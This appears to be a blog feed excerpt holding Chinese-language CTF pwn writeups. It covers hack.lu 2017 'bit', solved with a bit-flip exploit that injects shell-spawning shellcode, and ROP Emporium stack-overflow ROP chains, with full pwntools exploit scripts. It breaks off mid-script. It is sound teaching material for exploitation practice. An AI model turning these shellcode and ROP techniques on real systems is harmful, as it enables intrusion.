            <tag> pwn </tag>
            
            <tag> kanxue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hacklu ctf 2017 pwn writeup</title>
      <link href="2017-hacklu-ctf-pwn-writeup.html"/>
      <url>2017-hacklu-ctf-pwn-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="bit"><a href="#bit" class="headerlink" title="bit"></a>bit</h2><p>通过静态分析我们得到一些结论</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg"></a></p><p>输入的参数以<code>%lx:%u</code>组成，即由16进制数和无符号整型组成，中间以冒号分隔</p><p>此外，在静态分析的过程中我们会发现程序调用了<code>mprotect</code>函数，这会意味着,我们将由条件去修改内存的权限（也许是不可执行修改为可执行）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004006A7 loc_4006A7:                             ; CODE XREF: main+68↑j</span><br><span class="line">.text:00000000004006A7                 mov     rax, cs:qword_601018</span><br><span class="line">.text:00000000004006AE                 and     rax, 0FFFFFFFFFFFF1000h</span><br><span class="line">.text:00000000004006B4                 mov     edx, 7          ; prot</span><br><span class="line">.text:00000000004006B9                 mov     esi, 1000h      ; len</span><br><span class="line">.text:00000000004006BE                 mov     rdi, rax        ; addr</span><br><span class="line">.text:00000000004006C1                 call    _mprotect</span><br></pre></td></tr></table></figure><p>当我们继续往下分析当时候，我们会发现一个算是逻辑漏洞当点，就是，程序会去修改已经存在于指定的地址中的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006D7                 mov     rdx, cs:qword_601018</span><br><span class="line">.text:00000000004006DE                 movzx   edx, byte ptr [rdx]</span><br><span class="line">.text:00000000004006E1                 mov     ecx, cs:dword_601020</span><br><span class="line">.text:00000000004006E7                 mov     edi, 1</span><br><span class="line">.text:00000000004006EC                 shl     edi, cl</span><br><span class="line">.text:00000000004006EE                 mov     ecx, edi</span><br><span class="line">.text:00000000004006F0                 xor     edx, ecx</span><br><span class="line">.text:00000000004006F2                 mov     [rax], dl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg"></a></p><p>程序在0x400721会由一个canary 检查，检查程序是否发生栈溢出<br>通过<code>checksec</code>的检查，我们也会发现他开启了canary，nx，full relr0防护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/hacklu/pwn/bit/bit&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>那么我们如何去getshell呢？<br>题目的关键还是在那个指定地址，然后修改一位的地方，其实思路也是很简单，我们去注入shellcode在一个指定的地址，然后不断的去修改指定地址的值，直到修改到shellcode的地址，由于mprotect的作用，我们就可以获取一个shell</p><h3 id="exploit-编写"><a href="#exploit-编写" class="headerlink" title="exploit 编写"></a>exploit 编写</h3><p>第一步<br>思路，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400721                 xor     rsi, fs:28h</span><br><span class="line">.text:000000000040072A                 jz      short locret_400731</span><br><span class="line">.text:000000000040072C                 call    ___stack_chk_fail</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们注意到40072a这个地方有个跳转，我们可以进行去patch，让他不断到跳转到main函数去</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg"></a></p><p><code>io.sendline(&quot;0x40072b:4&quot;)</code></p><p>第二步<br>当我们这个时候，我们已经能够成功不断当返回到main函数之后，我们需要在一个地方写入shellcode</p><p>我们发现<code>0x400570</code>是个不错到选择，因为这快基本不会被调用到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">start = <span class="number">0x00400570</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>紧接着，我们只需要重新修改40072c到shellcdoe地址就可以</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span>   <span class="comment"># call 0x400570 (shellcode)</span></span><br><span class="line">start = <span class="number">0x0040072c</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后伪造canary到验证<br><code>io.sendline(0x400720:0)</code></p><p>完整exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_value</span>(<span class="params">io, elf, addr, new</span>):</span></span><br><span class="line">    <span class="comment"># write new bytes at addr address.</span></span><br><span class="line">    new = int(new.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    initial = elf.data[addr - <span class="number">0x400000</span>]</span><br><span class="line">    initial = int(initial.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;At &#123;&#125;, replace &#123;&#125; with &#123;&#125;&quot;</span>.format(hex(addr), hex(initial), hex(new)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (initial &amp; (<span class="number">1</span>&lt;&lt;bit)) != (new &amp; (<span class="number">1</span>&lt;&lt;bit)):</span><br><span class="line">            payload = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.format(hex(addr), bit)</span><br><span class="line">            io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    io = process(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line">    <span class="comment">#io = remote(&#x27;flatearth.fluxfingers.net&#x27;, 1744)</span></span><br><span class="line">    gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            break *0x400713</span></span><br><span class="line"><span class="string">            break *0x40072a</span></span><br><span class="line"><span class="string">            break *0x400681</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># patch jmp to loop on main()</span></span><br><span class="line">    <span class="comment">#   0x0040072a      7405           je 0x400731</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x40072b:4&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># write shellcode at 0x00400570</span></span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">    shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">    raw_input(<span class="string">&quot;make shellcode&quot;</span>)</span><br><span class="line">    start = <span class="number">0x00400570</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    raw_input(<span class="string">&quot;loop~~~~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch callq sym.imp.__stack_chk_fail()</span></span><br><span class="line">    <span class="comment">#   0x0040072c      e8bffdffff     callq sym.imp.__stack_chk_fail</span></span><br><span class="line">    <span class="comment"># Instead we want: call 0xfffffe44  (0xfffffe44 = -444 =&gt; 0x400570)</span></span><br><span class="line">    <span class="comment">#   root@pwn:/# rasm2 &#x27;call 0xfffffe44&#x27;</span></span><br><span class="line">    <span class="comment">#   e83ffeffff</span></span><br><span class="line">    new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span></span><br><span class="line">    start = <span class="number">0x0040072c</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># finally corrupt the cookie!</span></span><br><span class="line">    <span class="comment">#   0x0040071d      488b75f8       movq local_8h, %rsi</span></span><br><span class="line">    <span class="comment">#   0x00400721      644833342528.  xorq %fs:0x28, %rsi</span></span><br><span class="line">    <span class="comment">#   byte:0xf8 value:0 result:0xf9</span></span><br><span class="line">    <span class="comment"># Instead we want:</span></span><br><span class="line">    <span class="comment">#   movq local_7h, %rsi</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x400720:0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shell!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> hacklu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ropemporium-all-writeup</title>
      <link href="ropemporium-all-writeup.html"/>
      <url>ropemporium-all-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>前段时间k0师傅往群里发的一个网站，用来练习rop的题目，花了点时间做了<br>贴个官网链接<br><a href="https://ropemporium.com/">ropemporium</a></p><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><p>控制eip跳转到backdoor</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#pwnme_addr  = 0x080485F6</span></span><br><span class="line">ret = <span class="number">0x08048659</span></span><br><span class="line">io  = process(<span class="string">&quot;./ret2win32&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.ljust(<span class="number">44</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">payload += p32(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#pwnme_addr  = 0x080485F6</span></span><br><span class="line">ret = <span class="number">0x0400824</span></span><br><span class="line">io  = process(<span class="string">&quot;./ret2win&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;&#x27;.ljust(88,&quot;A&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="i386-1"><a href="#i386-1" class="headerlink" title="i386"></a>i386</h3><p>栈溢出控制eip后，跳转到system_plt 然后给system函数传参数。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split32&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split32&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">cat_flag = <span class="number">0x0804A030</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(cat_flag)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64-1"><a href="#amd64-1" class="headerlink" title="amd64"></a>amd64</h3><p>64位下需要寄存器传参数，我们需要找到gadget</p><p>对于system 需要pop rdi,ret 将rdi清空后，传入参数返回到system_addr</p><p>我们可以用ropgadget来找gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:50:11]</span></span><br><span class="line">$ ROPgadget --binary ./split/split --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400880 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400882 : pop r15 ; ret</span><br><span class="line">0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br><span class="line">0x0000000000400881 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:48:35]</span></span><br><span class="line">$ cat ./split/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">cat_flag_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>这个题目是考验选手对于参数传递和函数调用的知识，需要按照要求，以一定的参数，一定的顺序调用三个函数</p><p>###i386</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./callme32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./callme32&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80487B6</span></span><br><span class="line">call_me_one = <span class="number">0x080485C0</span></span><br><span class="line">call_me_two = <span class="number">0x8048620</span></span><br><span class="line">call_me_three = <span class="number">0x080485B0</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_one)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x8048801&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_two)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_three)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="amd64-2"><a href="#amd64-2" class="headerlink" title="amd64"></a>amd64</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:54:13]</span></span><br><span class="line">$ cat ./callme/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./callme&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pwnme_addr = <span class="number">0x401A05</span></span><br><span class="line">call_me_one = <span class="number">0x401850</span></span><br><span class="line">call_me_two = <span class="number">0x401870</span></span><br><span class="line">call_me_three = <span class="number">0x401810</span></span><br><span class="line">pppr_addr = <span class="number">0x0000000000401ab0</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004017d9</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_one)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;break *0x401850&#x27;&#x27;&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;callme_one&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += 